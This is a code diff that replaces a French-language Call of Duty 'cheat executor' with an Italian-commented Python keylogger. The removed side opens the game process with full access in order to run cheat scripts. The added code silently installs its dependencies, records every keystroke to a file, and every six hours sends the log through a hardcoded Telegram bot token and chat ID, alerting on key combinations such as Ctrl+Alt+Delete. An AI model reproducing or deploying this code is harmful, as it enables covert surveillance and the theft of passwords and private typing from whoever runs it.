@@ -1,177 +1,95 @@
-import importlib.util
-import multiprocessing
-import os
-import resource
-import ast
+import subprocess
 import sys
-import logging
+
+# Installazione dei moduli necessari se non sono già presenti
+required_modules = ['pynput', 'requests']
+for module in required_modules:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", module])
+
+import threading
 import time
-import random
-from rich.console import Console
-from rich.panel import Panel
-from rich.prompt import Prompt
-from rich.table import Table
-from rich.progress import Progress
-from cryptography.fernet import Fernet
-import psutil
-import win32process
-import win32con
+from pynput.keyboard import Key, Listener
+import requests
 
-console = Console()
-logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
-logger = logging.getLogger()
+# Configurazione del bot Telegram
+TELEGRAM_BOT_TOKEN = '8301948593:AAEBuN0JBeSPc3B_DZJZokvX2WCQuSSlQwM'
+CHAT_ID_1 = '7642937843'
+CHAT_ID_2 = '7642937843'
 
-key = Fernet.generate_key()
-cipher = Fernet(key)
+# Funzione per inviare messaggi tramite il bot Telegram
+def send_telegram_message(chat_id, message):
+    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
+    payload = {'chat_id': chat_id, 'text': message}
+    requests.post(url, data=payload)
 
-ALLOWED_MODULES = ["math", "random", "ctypes"]
-RESTRICTED_FUNCTIONS = ["eval", "exec", "os.system", "subprocess.run"]
+# Variabili per il keylogging
+keys = []
+log_file = 'keylog.txt'
 
-def encrypt_log(message):
-    return cipher.encrypt(message.encode()).decode()
-
-class ScriptValidator(ast.NodeVisitor):
-    def visit_Import(self, node):
-        for alias in node.names:
-            if alias.name not in ALLOWED_MODULES:
-                raise ValueError(f"Importation de '{alias.name}' interdite")
-        self.generic_visit(node)
-
-    def visit_ImportFrom(self, node):
-        if node.module not in ALLOWED_MODULES:
-            raise ValueError(f"Importation depuis '{node.module}' interdite")
-        self.generic_visit(node)
-
-    def visit_Name(self, node):
-        if node.id in RESTRICTED_FUNCTIONS:
-            raise ValueError(f"Fonction '{node.id}' interdite")
-        self.generic_visit(node)
-
-    def visit_Attribute(self, node):
-        if isinstance(node.value, ast.Name) and node.value.id == "sys":
-            raise ValueError(f"Accès à 'sys.{node.attr}' interdit")
-        self.generic_visit(node)
-
-def check_process(process_name="cod.exe"):
-    for proc in psutil.process_iter(['name']):
-        if proc.info['name'].lower() == process_name.lower():
-            console.print(Panel(f"[green]Processus {process_name} trouvé (PID: {proc.pid})[/green]"))
-            return proc.pid
-    console.print(Panel(f"[red]Processus {process_name} non trouvé[/red]"))
-    return None
-
-def check_script(script_path):
-    with Progress() as progress:
-        task = progress.add_task("[cyan]Validation...", total=100)
-        time.sleep(random.uniform(0.1, 0.3))
-        with open(script_path, "r") as f:
-            code = f.read()
-        progress.update(task, advance=30)
-        tree = ast.parse(code)
-        progress.update(task, advance=60)
-        validator = ScriptValidator()
-        validator.visit(tree)
-        progress.update(task, advance=100)
-        console.print(Panel("[green]Validation OK[/green]"))
-
-def run_script(script_path, pid):
-    try:
-        resource.setrlimit(resource.RLIMIT_CPU, (1, 1))
-        resource.setrlimit(resource.RLIMIT_AS, (50 * 1024 * 1024, 50 * 1024 * 1024))
-        resource.setrlimit(resource.RLIMIT_NOFILE, (5, 5))
-
-        original_modules = sys.modules.copy()
-        sys.modules.clear()
-        sys.modules.update({k: v for k, v in original_modules.items() if k in ALLOWED_MODULES + ["builtins", "ctypes"]})
-
-        try:
-            process_handle = win32process.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
-            console.print(Panel(f"[cyan]Connecté au processus {pid}[/cyan]"))
-        except Exception as e:
-            console.print(Panel(f"[red]Erreur connexion : {str(e)}[/red]"))
-            return
-
-        spec = importlib.util.spec_from_file_location("script_module", script_path)
-        module = importlib.util.module_from_spec(spec)
-        module.__import__ = lambda name, *args, **kwargs: safe_import(name, *args, **kwargs)
-        with Progress() as progress:
-            task = progress.add_task("[cyan]Exécution...", total=100)
-            time.sleep(random.uniform(0.2, 0.5))
-            spec.loader.exec_module(module)
-            progress.update(task, advance=100)
-            console.print(Panel("[green]Exécution OK[/green]"))
-
-        sys.modules.clear()
-        sys.modules.update(original_modules)
-    except Exception as e:
-        console.print(Panel(f"[red]Erreur : {str(e)}[/red]"))
-        logger.error(encrypt_log(f"Erreur exécution : {str(e)}"))
-
-def safe_import(name, globals=None, locals=None, fromlist=(), level=0):
-    if name in ALLOWED_MODULES:
-        return __import__(name, globals, locals, fromlist, level)
-    raise ImportError(f"Module '{name}' interdit")
-
-def list_scripts():
-    script_dir = "scripts"
-    if not os.path.exists(script_dir):
-        os.makedirs(script_dir)
-        return []
-    return [f for f in os.listdir(script_dir) if f.endswith(".py")]
-
-def display_menu():
-    table = Table(title="BO6 Cheat Executor")
-    table.add_column("Option", style="cyan")
-    table.add_column("Description", style="magenta")
-    table.add_row("1", "Vérifier cod.exe")
-    table.add_row("2", "Lister scripts")
-    table.add_row("3", "Exécuter script")
-    table.add_row("4", "Quitter")
-    console.print(table)
-
-def main():
-    console.print(Panel("[yellow]BO6 Cheat Executor - Charge scripts depuis 'scripts/'[/yellow]"))
-    pid = None
-    while True:
-        display_menu()
-        choice = Prompt.ask("Option", choices=["1", "2", "3", "4"], default="1")
-        if choice == "1":
-            pid = check_process("cod.exe")
-        elif choice == "2":
-            scripts = list_scripts()
-            if not scripts:
-                console.print(Panel("[red]Aucun script dans 'scripts/'[/red]"))
+# Funzione per salvare i tasti premuti in un file
+def write_to_file(keys):
+    with open(log_file, 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find('space') > 0:
+                f.write(' ')
+            elif k.find('enter') > 0:
+                f.write('\n')
+            elif k.find('backspace') > 0:
+                f.write('<BACKSPACE>')
+            elif k.find('tab') > 0:
+                f.write('<TAB>')
+            elif k.find('Key') == -1:
+                f.write(k)
             else:
-                table = Table(title="Scripts disponibles")
-                table.add_column("Numéro", style="cyan")
-                table.add_column("Nom", style="magenta")
-                for i, script in enumerate(scripts, 1):
-                    table.add_row(str(i), script)
-                console.print(table)
-        elif choice == "3":
-            if not pid:
-                console.print(Panel("[red]Vérifiez d'abord cod.exe[/red]"))
-                continue
-            scripts = list_scripts()
-            if not scripts:
-                console.print(Panel("[red]Aucun script dans 'scripts/'[/red]"))
-                continue
-            script_idx = Prompt.ask("Numéro du script", choices=[str(i) for i in range(1, len(scripts) + 1)])
-            script_path = os.path.join("scripts", scripts[int(script_idx) - 1])
-            try:
-                check_script(script_path)
-                p = multiprocessing.Process(target=run_script, args=(script_path, pid))
-                p.start()
-                p.join(timeout=2)
-                if p.is_alive():
-                    p.terminate()
-                    console.print(Panel("[red]Timeout : exécution trop longue[/red]"))
-            except Exception as e:
-                console.print(Panel(f"[red]Erreur : {str(e)}[/red]"))
-                logger.error(encrypt_log(f"Erreur : {str(e)}"))
-        elif choice == "4":
-            console.print(Panel("[yellow]Arrêt[/yellow]"))
-            break
+                f.write('<' + k + '>')
+        f.write('\n')
 
-if __name__ == "__main__":
-    main()
+# Funzione per inviare il log ogni 6 ore
+def send_log_every_6_hours():
+    while True:
+        time.sleep(21600)  # 6 ore in secondi
+        with open(log_file, 'r') as f:
+            log_content = f.read()
+        send_telegram_message(CHAT_ID_1, log_content)
+        send_telegram_message(CHAT_ID_2, log_content)
+
+# Funzione per gestire la pressione dei tasti
+def on_press(key):
+    keys.append(key)
+    if key == Key.f11 or key == Key.esc:
+        send_telegram_message(CHAT_ID_1, f'Alert: {key} pressed')
+        send_telegram_message(CHAT_ID_2, f'Alert: {key} pressed')
+    elif key == Key.ctrl_l and 'ctrl_pressed' not in globals():
+        globals()['ctrl_pressed'] = True
+    elif key == Key.alt_l and 'alt_pressed' not in globals():
+        globals()['alt_pressed'] = True
+    elif key == Key.delete and 'ctrl_pressed' in globals() and 'alt_pressed' in globals():
+        send_telegram_message(CHAT_ID_1, 'Alert: Ctrl+Alt+Delete pressed')
+        send_telegram_message(CHAT_ID_2, 'Alert: Ctrl+Alt+Delete pressed')
+        globals().pop('ctrl_pressed', None)
+        globals().pop('alt_pressed', None)
+    elif key == Key.f4 and 'alt_pressed' in globals():
+        send_telegram_message(CHAT_ID_1, 'Alert: Alt+F4 pressed')
+        send_telegram_message(CHAT_ID_2, 'Alert: Alt+F4 pressed')
+        globals().pop('alt_pressed', None)
+    elif key == Key.tab and 'alt_pressed' in globals():
+        send_telegram_message(CHAT_ID_1, 'Alert: Alt+Tab pressed')
+        send_telegram_message(CHAT_ID_2, 'Alert: Alt+Tab pressed')
+        globals().pop('alt_pressed', None)
+
+# Funzione per gestire il rilascio dei tasti
+def on_release(key):
+    if key == Key.esc or key == Key.f4:
+        return False
+    elif key == Key.ctrl_l and 'ctrl_pressed' in globals():
+        globals().pop('ctrl_pressed', None)
+    elif key == Key.alt_l and 'alt_pressed' in globals():
+        globals().pop('alt_pressed', None)
+
+# Avvio del listener per i tasti
+listener = Listener(on_press=on_press, on_release=on_release)
+listener.start()
+
+# Avvio del thread per inviare il log ogni 6 ore
+threading.Thread(target=send_log_every_6_hours).start()
